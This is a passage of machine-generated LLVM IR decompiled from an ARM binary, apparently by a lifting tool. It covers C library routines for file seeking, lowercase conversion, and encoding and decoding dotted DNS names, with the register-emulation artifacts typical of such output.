  uselistorder i32* @r7, { 65, 67, 68, 66, 69, 70, 71, 72, 73, 74, 9, 10, 11, 12, 13, 14, 15, 1, 75, 83, 82, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 42, 43, 44, 45, 116, 16, 17, 2, 18, 6, 19, 20, 21, 22, 23, 24, 25, 26, 27, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 46, 47, 48, 49, 28, 29, 30, 31, 84, 3, 85, 86, 4, 5, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 0, 7, 8, 114, 115, 61, 62, 63, 64, 76, 77, 78, 79, 80, 81, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder label %dec_label_pc_171a0, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1719c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1716c, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_17168, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1710c, { 1, 0 }
  uselistorder label %dec_label_pc_170b8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_17058.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_17098, { 1, 0 }
  uselistorder label %dec_label_pc_17014, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_16ec8, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_171f4, label %dec_label_pc_171e0

dec_label_pc_171e0:                               ; preds = %entry
  %v0_171e0 = call i32 @__errno_location()
  %v0_171e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_171e4 = sub i32 0, %v0_171e4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_171ec = inttoptr i32 %v0_171e0 to i32*
  store i32 %v1_171e4, i32* %v2_171ec, align 4
  %v0_171fc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_171fc

dec_label_pc_171f4:                               ; preds = %entry
  %v2_171f4 = icmp eq i32 %arg1, 0
  br i1 %v2_171f4, label %dec_label_pc_17208, label %dec_label_pc_171fc

dec_label_pc_171fc:                               ; preds = %dec_label_pc_171f4, %dec_label_pc_171e0
  %v0_171fc = phi i32 [ %arg1, %dec_label_pc_171f4 ], [ %v0_171fc.pre, %dec_label_pc_171e0 ]
  br label %dec_label_pc_1720c

dec_label_pc_17208:                               ; preds = %dec_label_pc_171f4
  br label %dec_label_pc_1720c

dec_label_pc_1720c:                               ; preds = %dec_label_pc_171fc, %dec_label_pc_17208
  %v14_17210 = phi i32 [ %v0_171fc, %dec_label_pc_171fc ], [ %tmp9, %dec_label_pc_17208 ]
  ret i32 %v14_17210

; uselistorder directives
  uselistorder i32 ()* @__errno_location, { 53, 44, 71, 70, 69, 14, 43, 52, 51, 42, 18, 38, 50, 49, 27, 55, 11, 10, 9, 8, 24, 7, 23, 73, 65, 64, 57, 56, 68, 67, 66, 17, 63, 26, 37, 36, 54, 16, 30, 33, 41, 32, 35, 48, 47, 46, 0, 40, 39, 15, 45, 6, 5, 62, 29, 28, 61, 22, 4, 13, 1, 21, 12, 60, 59, 34, 20, 19, 58, 3, 2, 72, 31, 25 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1720c, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1721c = icmp slt i32 %arg1, 0
  br i1 %v1_1721c, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_1721c = mul i32 %arg1, 2
  %v2_17228 = load i32, i32* bitcast (i32** @global_var_23ae8.704 to i32*), align 4
  %v2_1722c = add i32 %v2_17228, %v2_1721c
  %v3_17230 = inttoptr i32 %v2_1722c to i8*
  %v4_17230 = load i8, i8* %v3_17230, align 1
  %v6_17230 = zext i8 %v4_17230 to i32
  %v1_17234 = add i32 %v2_1722c, 1
  %v2_17234 = inttoptr i32 %v1_17234 to i8*
  %v3_17234 = load i8, i8* %v2_17234, align 1
  %v4_17234 = zext i8 %v3_17234 to i32
  %v3_17238 = mul nuw i32 %v4_17234, 16777216
  %v4_1723c = sdiv i32 %v3_17238, 65536
  %v5_1723c = or i32 %v4_1723c, %v6_17230
  ret i32 %v5_1723c

; uselistorder directives
  uselistorder i32 %v2_1722c, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_17248 = load i32, i32* @r4, align 4
  store i32 %v3_17248, i32* %stack_var_-24, align 4
  %v6_17248 = load i32, i32* @r5, align 4
  %v9_17248 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_17250 = load i32, i32* @r1, align 4
  store i32 %v0_17250, i32* @r6, align 4
  %v0_17254 = load i32, i32* @r2, align 4
  store i32 %v0_17254, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_172bc19 = icmp slt i8* %arg1, null
  store i1 %v1_172bc19, i1* %cpsr_n.global-to-local, align 1
  %v2_172bc20 = icmp eq i8* %arg1, null
  store i1 %v2_172bc20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_172bc20, label %dec_label_pc_172d4, label %dec_label_pc_172c8

dec_label_pc_17260:                               ; preds = %dec_label_pc_172c8
  %v2_17260 = call i32 @__GI_strchr(i32 %v0_1726021, i32 46)
  store i32 %v2_17260, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17264 = icmp slt i32 %v2_17260, 0
  store i1 %v1_17264, i1* %cpsr_n.global-to-local, align 1
  %v2_17264 = icmp eq i32 %v2_17260, 0
  store i1 %v2_17264, i1* %cpsr_z.global-to-local, align 1
  %v0_17268 = load i32, i32* @r4, align 4
  %v2_17268 = sub i32 %v2_17260, %v0_17268
  store i32 %v2_17268, i32* @ip, align 4
  store i32 %v0_17268, i32* %r0.global-to-local, align 4
  br i1 %v2_17264, label %dec_label_pc_17274, label %dec_label_pc_1727c

dec_label_pc_17274:                               ; preds = %dec_label_pc_17260
  %v1_1726c = inttoptr i32 %v0_17268 to i8*
  %v3_17274 = call i32 @strlen(i8* %v1_1726c)
  store i32 %v3_17274, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_17274, 16777216
  %v1_17278 = sdiv i32 %sext, 16777216
  store i32 %v1_17278, i32* @ip, align 4
  %v0_17288.pre = load i32, i32* @r4, align 4
  %v0_17298.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1727c

dec_label_pc_1727c:                               ; preds = %dec_label_pc_17260, %dec_label_pc_17274
  %v0_17298 = phi i32 [ %v2_17260, %dec_label_pc_17260 ], [ %v0_17298.pre, %dec_label_pc_17274 ]
  %v0_17288 = phi i32 [ %v0_17268, %dec_label_pc_17260 ], [ %v0_17288.pre, %dec_label_pc_17274 ]
  %v0_172a8 = phi i32 [ %v2_17268, %dec_label_pc_17260 ], [ %v1_17278, %dec_label_pc_17274 ]
  %v0_1727c = load i32, i32* %r7.global-to-local, align 4
  %v1_1727c = add i32 %v0_1727c, 1
  store i32 %v1_1727c, i32* @lr, align 4
  %v1_17280 = load i32, i32* %r8.global-to-local, align 4
  %v2_17280 = sub i32 %v1_17280, %v0_1727c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17284 = icmp slt i32 %v0_172a8, 0
  store i1 %v1_17284, i1* %cpsr_n.global-to-local, align 1
  %v2_17284 = icmp eq i32 %v0_172a8, 0
  store i1 %v2_17284, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_17288, i32* @r1, align 4
  %v0_1728c = load i32, i32* @r6, align 4
  %v2_1728c = add i32 %v0_1728c, %v1_1727c
  store i32 %v2_1728c, i32* @r0, align 4
  store i32 %v0_172a8, i32* @r2, align 4
  %v1_17294 = add i32 %v2_17280, -1
  %v1_17298 = add i32 %v0_17298, 1
  store i32 %v1_17298, i32* @r4, align 4
  br i1 %v2_17284, label %.loopexit, label %dec_label_pc_172a0

dec_label_pc_172a0:                               ; preds = %dec_label_pc_1727c
  %v2_172a0 = sub i32 %v0_172a8, %v1_17294
  %v3_172a0 = icmp ult i32 %v0_172a8, %v1_17294
  %v4_172a0 = xor i32 %v1_17294, %v0_172a8
  %v5_172a0 = xor i32 %v2_172a0, %v0_172a8
  %v6_172a0 = and i32 %v5_172a0, %v4_172a0
  %v7_172a0 = icmp slt i32 %v6_172a0, 0
  store i1 %v7_172a0, i1* %cpsr_v.global-to-local, align 1
  %v8_172a0 = icmp slt i32 %v2_172a0, 0
  store i1 %v8_172a0, i1* %cpsr_n.global-to-local, align 1
  %v9_172a0 = icmp eq i32 %v0_172a8, %v1_17294
  store i1 %v9_172a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_172a0, label %dec_label_pc_172a8, label %.loopexit

dec_label_pc_172a8:                               ; preds = %dec_label_pc_172a0
  %v1_172a8 = trunc i32 %v0_172a8 to i8
  %v4_172a8 = add i32 %v0_1728c, %v0_1727c
  %v5_172a8 = inttoptr i32 %v4_172a8 to i8*
  store i8 %v1_172a8, i8* %v5_172a8, align 1
  %v0_172ac = load i32, i32* @lr, align 4
  %v1_172ac = load i32, i32* @ip, align 4
  %v2_172ac = add i32 %v1_172ac, %v0_172ac
  store i32 %v2_172ac, i32* %r7.global-to-local, align 4
  %v0_172b0 = call i32 @memcpy()
  store i32 %v0_172b0, i32* %r0.global-to-local, align 4
  %v0_172b4 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_172b4 = icmp slt i32 %v0_172b4, 0
  store i1 %v1_172b4, i1* %cpsr_n.global-to-local, align 1
  %v2_172b4 = icmp eq i32 %v0_172b4, 0
  store i1 %v2_172b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_172b4, label %dec_label_pc_172d4, label %dec_label_pc_172a8.dec_label_pc_172bc_crit_edge

dec_label_pc_172a8.dec_label_pc_172bc_crit_edge:  ; preds = %dec_label_pc_172a8
  %v0_172bc.pre = load i32, i32* @r4, align 4
  store i32 %v0_172bc.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_172bc = icmp slt i32 %v0_172bc.pre, 0
  store i1 %v1_172bc, i1* %cpsr_n.global-to-local, align 1
  %v2_172bc = icmp eq i32 %v0_172bc.pre, 0
  store i1 %v2_172bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_172bc, label %dec_label_pc_172d4, label %dec_label_pc_172c8

dec_label_pc_172c8:                               ; preds = %entry, %dec_label_pc_172a8.dec_label_pc_172bc_crit_edge
  %v0_1726021 = phi i32 [ %v0_172bc.pre, %dec_label_pc_172a8.dec_label_pc_172bc_crit_edge ], [ %tmp, %entry ]
  %v1_172c8 = inttoptr i32 %v0_1726021 to i8*
  %v2_172c8 = load i8, i8* %v1_172c8, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_172cc = icmp eq i8 %v2_172c8, 0
  store i1 %v2_172cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_172cc, label %dec_label_pc_172d4, label %dec_label_pc_17260

dec_label_pc_172d4:                               ; preds = %dec_label_pc_172a8.dec_label_pc_172bc_crit_edge, %dec_label_pc_172a8, %dec_label_pc_172c8, %entry
  %v0_172d4 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_172d4 = icmp slt i32 %v0_172d4, 0
  store i1 %v1_172d4, i1* %cpsr_n.global-to-local, align 1
  %v2_172d4 = icmp eq i32 %v0_172d4, 0
  store i1 %v2_172d4, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_172d4, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_172d4
  %v5_172dc = load i32, i32* %r7.global-to-local, align 4
  %v6_172dc = add i32 %v5_172dc, 1
  store i32 %v6_172dc, i32* %r0.global-to-local, align 4
  %v7_172e0 = load i32, i32* @r6, align 4
  %v9_172e0 = add i32 %v7_172e0, %v5_172dc
  %v10_172e0 = inttoptr i32 %v9_172e0 to i8*
  store i8 0, i8* %v10_172e0, align 1
  %v0_172e4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_172e4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_172e4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_172d4, %bb
  %v2_172e4 = phi i1 [ %v2_172e4.pre, %bb ], [ false, %dec_label_pc_172d4 ]
  %v1_172e4 = phi i1 [ %v1_172e4.pre, %bb ], [ %v1_172d4, %dec_label_pc_172d4 ]
  %v0_172e4 = phi i1 [ %v0_172e4.pre, %bb ], [ %v2_172d4, %dec_label_pc_172d4 ]
  %v3_172e4 = xor i1 %v2_172e4, %v1_172e4
  %v4_172e4 = or i1 %v0_172e4, %v3_172e4
  br i1 %v4_172e4, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_172e4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_172e4, i32* @r4, align 4
  store i32 %v6_17248, i32* @r5, align 4
  store i32 %v9_17248, i32* @r6, align 4
  %v25_172e4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_172e4

.loopexit:                                        ; preds = %dec_label_pc_172a0, %dec_label_pc_1727c, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_172ec = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_172ec, i32* @r4, align 4
  store i32 %v6_17248, i32* @r5, align 4
  store i32 %v9_17248, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_172d4, { 0, 2, 1 }
  uselistorder i32 %v0_172bc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_172b4, { 1, 0 }
  uselistorder i32 %v2_172a0, { 1, 0 }
  uselistorder i32 %v1_17294, { 2, 0, 3, 1 }
  uselistorder i32 %v0_172a8, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_17278, { 1, 0 }
  uselistorder i32 %v0_17268, { 0, 2, 1, 3 }
  uselistorder i1 %v2_172bc20, { 1, 0 }
  uselistorder i32 %v9_17248, { 1, 0 }
  uselistorder i32 %v6_17248, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 7, 2, 6, 3, 5, 4, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 29, 28, 31, 30, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 44, 42, 45, 43, 48, 46, 49, 47, 51, 50, 53, 52, 55, 54, 57, 56 }
  uselistorder i32 (i8*)* @strlen, { 9, 21, 20, 8, 5, 13, 12, 11, 22, 19, 18, 17, 15, 16, 14, 7, 6, 10, 25, 24, 23, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 46, { 0, 3, 4, 1, 2 }
  uselistorder i32* @r6, { 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 11, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 1, 0, 18, 19, 20, 21, 22, 137, 2, 138, 139, 140, 147, 148, 149, 150, 54, 3, 55, 56, 57, 151, 155, 154, 156, 157, 158, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 4, 71, 72, 73, 74, 75, 76, 77, 210, 215, 28, 29, 23, 24, 25, 103, 104, 105, 106, 26, 27, 30, 31, 32, 33, 34, 35, 36, 37, 207, 208, 209, 187, 188, 5, 189, 190, 191, 192, 193, 194, 204, 13, 205, 206, 6, 78, 195, 196, 197, 198, 199, 200, 141, 142, 143, 144, 145, 146, 79, 80, 81, 82, 83, 84, 85, 86, 159, 160, 161, 162, 163, 7, 12, 164, 38, 8, 39, 40, 165, 9, 166, 167, 87, 88, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 15, 16, 17, 89, 90, 91, 92, 211, 212, 213, 214, 14, 168, 169, 170, 171, 10, 172, 173, 174, 175, 152, 153, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 201, 202, 203 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_172d4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_172c8, { 1, 0 }
  uselistorder label %dec_label_pc_1727c, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_172f0 = load i32, i32* @r4, align 4
  %v6_172f0 = load i32, i32* @r5, align 4
  %v0_172f4 = load i32, i32* @r0, align 4
  store i32 %v0_172f4, i32* %sl.global-to-local, align 4
  %v2_172f4 = icmp eq i32 %v0_172f4, 0
  br i1 %v2_172f4, label %.thread16, label %dec_label_pc_17394.preheader

.thread16:                                        ; preds = %entry
  %v0_173001 = load i32, i32* @r2, align 4
  store i32 %v0_173001, i32* %sb.global-to-local, align 4
  %v0_173042 = load i32, i32* @r3, align 4
  store i32 %v0_173042, i32* %stack_var_-40, align 4
  br label %dec_label_pc_173b4

dec_label_pc_17394.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_17300 = load i32, i32* @r2, align 4
  store i32 %v0_17300, i32* %sb.global-to-local, align 4
  %v0_17304 = load i32, i32* @r3, align 4
  store i32 %v0_17304, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_173943952 = load i32, i32* @r1, align 4
  %v2_173944053 = add i32 %v1_173943952, %v0_172f4
  %v3_173944154 = inttoptr i32 %v2_173944053 to i8*
  %v4_173944255 = load i8, i8* %v3_173944154, align 1
  %v6_173944356 = zext i8 %v4_173944255 to i32
  store i32 %v6_173944356, i32* @r4, align 4
  %v2_173984457 = icmp eq i8 %v4_173944255, 0
  br i1 %v2_173984457, label %bb35, label %dec_label_pc_17318.lr.ph

dec_label_pc_17318:                               ; preds = %dec_label_pc_17318.lr.ph, %bb30
  %v2_173a050 = phi i1 [ %v2_173a04663, %dec_label_pc_17318.lr.ph ], [ true, %bb30 ]
  %v6_1739448 = phi i32 [ %v6_173944361, %dec_label_pc_17318.lr.ph ], [ %v6_17394, %bb30 ]
  %v1_1739447 = phi i32 [ %v1_173943960, %dec_label_pc_17318.lr.ph ], [ %v5_17340, %bb30 ]
  %v1_1731c = and i32 %v6_1739448, 192
  br i1 %v2_173a050, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_17318
  %v1_17320 = load i32, i32* %r8.global-to-local, align 4
  %v2_17320 = add i32 %v1_17320, 1
  store i32 %v2_17320, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_17318, %bb
  %v2_17324 = icmp eq i32 %v1_1731c, 192
  %v1_17328 = add i32 %v1_1739447, 1
  store i32 %v1_17328, i32* @r5, align 4
  br i1 %v2_17324, label %dec_label_pc_17330, label %dec_label_pc_17350

dec_label_pc_17330:                               ; preds = %bb28
  %v2_17330 = add i32 %v1_17328, %v0_17330.ph59
  %v3_17330 = inttoptr i32 %v2_17330 to i8*
  %v4_17330 = load i8, i8* %v3_17330, align 1
  %v6_17330 = zext i8 %v4_17330 to i32
  %v1_17338 = urem i32 %v6_1739448, 64
  br i1 %v2_173a050, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_17330
  %v1_1733c = load i32, i32* %r8.global-to-local, align 4
  %v2_1733c = add i32 %v1_1733c, 1
  store i32 %v2_1733c, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_17330, %bb29
  %v4_17340 = mul nuw nsw i32 %v1_17338, 256
  %v5_17340 = or i32 %v6_17330, %v4_17340
  store i32 %v5_17340, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_17394 = add i32 %v5_17340, %v0_17330.ph59
  %v3_17394 = inttoptr i32 %v2_17394 to i8*
  %v4_17394 = load i8, i8* %v3_17394, align 1
  %v6_17394 = zext i8 %v4_17394 to i32
  store i32 %v6_17394, i32* @r4, align 4
  %v2_17398 = icmp eq i8 %v4_17394, 0
  br i1 %v2_17398, label %dec_label_pc_173a0.bb36_crit_edge, label %dec_label_pc_17318

dec_label_pc_17350:                               ; preds = %bb28
  %v2_17350 = add i32 %v6_1739448, %storemerge17.ph58
  store i32 %v2_17350, i32* %r6.global-to-local, align 4
  %v2_17354 = load i32, i32* %stack_var_-40, align 4
  %v1_17358 = add i32 %v2_17350, 1
  store i32 %v1_17358, i32* %r7.global-to-local, align 4
  %v3_1735c = icmp ult i32 %v1_17358, %v2_17354
  br i1 %v3_1735c, label %dec_label_pc_17364, label %dec_label_pc_173b4

dec_label_pc_17364:                               ; preds = %dec_label_pc_17350
  %v2_17364 = add i32 %v1_17328, %v0_17330.ph59
  store i32 %v2_17364, i32* @r1, align 4
  %v0_17368 = load i32, i32* %sb.global-to-local, align 4
  %v2_17368 = add i32 %v0_17368, %storemerge17.ph58
  store i32 %v2_17368, i32* @r0, align 4
  store i32 %v6_1739448, i32* @r2, align 4
  %v0_17370 = call i32 @memcpy()
  %v0_17374 = load i32, i32* @r5, align 4
  %v1_17374 = load i32, i32* @r4, align 4
  %v2_17374 = add i32 %v1_17374, %v0_17374
  store i32 %v2_17374, i32* %r1.global-to-local, align 4
  %v0_17378 = load i32, i32* %sl.global-to-local, align 4
  %v2_17378 = add i32 %v0_17378, %v2_17374
  %v3_17378 = inttoptr i32 %v2_17378 to i8*
  %v4_17378 = load i8, i8* %v3_17378, align 1
  %v0_1737c = load i32, i32* %fp.global-to-local, align 4
  %v2_1737c = icmp eq i32 %v0_1737c, 0
  br i1 %v2_1737c, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_17364
  %v1_17380 = load i32, i32* %r8.global-to-local, align 4
  %v3_17380 = add i32 %v1_17380, %v1_17374
  store i32 %v3_17380, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_17364, %bb31
  %v2_17384 = icmp eq i8 %v4_17378, 0
  br i1 %v2_17384, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_1738c.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_1738c = load i32, i32* %sb.global-to-local, align 4
  %v3_1738c = load i32, i32* %r6.global-to-local, align 4
  %v4_1738c = add i32 %v3_1738c, %v2_1738c
  %v5_1738c = inttoptr i32 %v4_1738c to i8*
  store i8 %v0_1738c.off0, i8* %v5_1738c, align 1
  %v0_17390.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_17394.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_173a0.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1739439 = load i32, i32* %r1.global-to-local, align 4
  %v2_1739440 = add i32 %v1_1739439, %v0_17394.pre.pre
  %v3_1739441 = inttoptr i32 %v2_1739440 to i8*
  %v4_1739442 = load i8, i8* %v3_1739441, align 1
  %v6_1739443 = zext i8 %v4_1739442 to i32
  store i32 %v6_1739443, i32* @r4, align 4
  %v2_1739844 = icmp eq i8 %v4_1739442, 0
  %v2_173a046 = icmp eq i32 %v0_173a0.pre.pre, 0
  br i1 %v2_1739844, label %dec_label_pc_173a0, label %dec_label_pc_17318.lr.ph

dec_label_pc_17318.lr.ph:                         ; preds = %dec_label_pc_17394.preheader, %bb34
  %v2_173a04663 = phi i1 [ %v2_173a046, %bb34 ], [ false, %dec_label_pc_17394.preheader ]
  %v6_173944361 = phi i32 [ %v6_1739443, %bb34 ], [ %v6_173944356, %dec_label_pc_17394.preheader ]
  %v1_173943960 = phi i32 [ %v1_1739439, %bb34 ], [ %v1_173943952, %dec_label_pc_17394.preheader ]
  %v0_17330.ph59 = phi i32 [ %v0_17394.pre.pre, %bb34 ], [ %v0_172f4, %dec_label_pc_17394.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_17390.pre, %bb34 ], [ 0, %dec_label_pc_17394.preheader ]
  br label %dec_label_pc_17318

dec_label_pc_173a0:                               ; preds = %bb34
  br i1 %v2_173a046, label %dec_label_pc_173a0.bb36_crit_edge, label %bb35

dec_label_pc_173a0.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_173a0
  %v0_173a8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_173b4

bb35:                                             ; preds = %dec_label_pc_17394.preheader, %dec_label_pc_173a0
  %v1_173a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_173a4 = add i32 %v1_173a4, 1
  store i32 %v2_173a4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_173b4

dec_label_pc_173b4:                               ; preds = %dec_label_pc_17350, %bb35, %dec_label_pc_173a0.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_173a8.pre, %dec_label_pc_173a0.bb36_crit_edge ], [ %v2_173a4, %bb35 ], [ -1, %dec_label_pc_17350 ]
  store i32 %v3_172f0, i32* @r4, align 4
  store i32 %v6_172f0, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_17330.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_17394, { 1, 0 }
  uselistorder i32 %v5_17340, { 0, 2, 1 }
  uselistorder i32 %v6_1739448, { 2, 1, 0, 3 }
  uselistorder i1 %v2_173a050, { 1, 0 }
  uselistorder i32 %v0_172f4, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 5, 4, 1, 6, 2, 7, 3, 8, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i1 false, { 0, 8, 40, 36, 41, 42, 43, 44, 45, 2, 75, 4, 46, 13, 47, 48, 49, 12, 50, 51, 53, 54, 55, 56, 57, 58, 59, 52, 15, 60, 28, 16, 29, 61, 62, 63, 18, 17, 9, 10, 64, 65, 66, 11, 19, 67, 30, 31, 68, 32, 33, 20, 37, 38, 5, 21, 69, 34, 35, 70, 71, 14, 22, 72, 73, 74, 39, 76, 1, 25, 24, 26, 23, 6, 7, 27, 3, 77 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 ()* @memcpy, { 11, 10, 19, 3, 9, 8, 7, 2, 17, 16, 1, 0, 18, 6, 15, 14, 13, 20, 12, 5, 4 }
  uselistorder i32 64, { 0, 8, 4, 5, 6, 1, 2, 11, 12, 7, 3, 9, 10, 13 }
  uselistorder i32* @r3, { 11, 0, 12, 13, 3, 4, 14, 5, 6, 7, 8, 1, 2, 17, 20, 18, 19, 15, 9, 10, 16, 21 }
